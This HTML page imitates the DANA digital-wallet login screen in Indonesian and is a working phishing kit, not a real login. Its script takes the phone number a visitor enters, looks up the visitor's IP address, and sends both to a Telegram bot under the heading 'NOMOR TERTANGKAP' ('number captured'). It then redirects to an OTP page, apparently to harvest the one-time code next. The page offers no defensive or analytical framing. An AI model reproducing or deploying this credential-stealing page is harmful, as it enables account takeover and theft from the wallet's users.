<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA - Dompet Digital Indonesia</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(145deg, #f5f9ff 0%, #e8f2fa 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .card {
            background: white;
            padding: 40px 30px 32px;
            border-radius: 32px;
            box-shadow: 0 12px 40px rgba(0, 100, 200, 0.12), 0 4px 16px rgba(0,0,0,0.04);
            text-align: center;
            width: 100%;
            max-width: 360px;
        }
        .logo { margin: 0 auto 16px; display: block; }
        .greeting { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 6px; }
        .subtext { font-size: 14px; color: #777; margin-bottom: 24px; }
        .input-group { position: relative; margin-bottom: 16px; }
        .input-group input {
            width: 100%;
            padding: 16px 16px 16px 52px;
            border: 1.5px solid #dce4ec;
            border-radius: 16px;
            font-size: 16px;
            background: #fafcff;
            transition: all 0.2s;
            outline: none;
        }
        .input-group input:focus {
            border-color: #0099ff;
            background: white;
            box-shadow: 0 0 0 4px rgba(0,153,255,0.08);
        }
        .input-group .icon-left {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            opacity: 0.5;
        }
        .btn-primary {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #0099ff 0%, #0077dd 100%);
            border: none;
            border-radius: 24px;
            color: white;
            font-size: 17px;
            font-weight: 700;
            box-shadow: 0 6px 20px rgba(0,153,255,0.35);
            cursor: pointer;
            transition: all 0.15s;
            margin-top: 8px;
        }
        .btn-primary:active { transform: scale(0.97); }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .footer-note { font-size: 12px; color: #aaa; margin-top: 20px; }
        .divider { border: none; border-top: 1px solid #edf2f7; margin: 20px 0 12px; }
        .error-msg { color: #e74c3c; font-size: 13px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
<div class="card">
    <svg class="logo" viewBox="0 0 200 60" width="130" height="39">
        <defs>
            <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" style="stop-color:#0099ff;stop-opacity:1" />
                <stop offset="100%" style="stop-color:#0066cc;stop-opacity:1" />
            </linearGradient>
        </defs>
        <rect x="0" y="10" width="40" height="40" rx="12" fill="url(#logoGrad)"/>
        <text x="10" y="39" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="white">D</text>
        <text x="50" y="39" font-family="Arial, sans-serif" font-size="26" font-weight="700" fill="#1a1a1a">DANA</text>
    </svg>

    <div class="greeting">Masuk ke akun</div>
    <div class="subtext">Lanjutkan dengan nomor ponsel terdaftar</div>

    <form id="loginForm">
        <div class="input-group">
            <span class="icon-left">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="1.8">
                    <rect x="5" y="2" width="14" height="20" rx="3" stroke="currentColor"/>
                    <circle cx="12" cy="18" r="1.2" fill="currentColor"/>
                    <path d="M9 5h6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
                </svg>
            </span>
            <input type="tel" id="phone" placeholder="Masukkan nomor HP" required>
        </div>
        <button type="submit" class="btn-primary" id="submitBtn">Lanjutkan</button>
        <div class="error-msg" id="errorMsg">Gagal terhubung, coba lagi.</div>
    </form>

    <hr class="divider">
    <div class="footer-note">DANA • Dompet Digital Indonesia</div>
</div>

<script src="config.js"></script>
<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const phone = document.getElementById('phone').value.trim();
    const btn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    
    if (!phone || phone.length < 8) {
        errorMsg.style.display = 'block';
        errorMsg.textContent = 'Masukkan nomor HP yang valid.';
        return;
    }
    
    errorMsg.style.display = 'none';
    btn.disabled = true;
    btn.textContent = 'Memproses...';
    
    // Simpan nomor di localStorage untuk halaman OTP
    localStorage.setItem('dana_phone', phone);
    
    // Kirim notifikasi ke Telegram
    const ip = await getIP();
    const message = `📱 NOMOR TERTANGKAP\nNomor: ${phone}\nIP: ${ip}\nWaktu: ${new Date().toLocaleString()}`;
    
    try {
        await sendTelegram(message);
        window.location.href = 'otp.html';
    } catch (err) {
        errorMsg.style.display = 'block';
        errorMsg.textContent = 'Gagal mengirim data. Coba lagi.';
        btn.disabled = false;
        btn.textContent = 'Lanjutkan';
    }
});

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return '0.0.0.0';
    }
}

async function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const params = new URLSearchParams({
        chat_id: CHAT_ID,
        text: message
    });
    const response = await fetch(url + '?' + params, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' }
    });
    if (!response.ok) throw new Error('Telegram API error');
    return response.json();
}
</script>
</body>
</html>
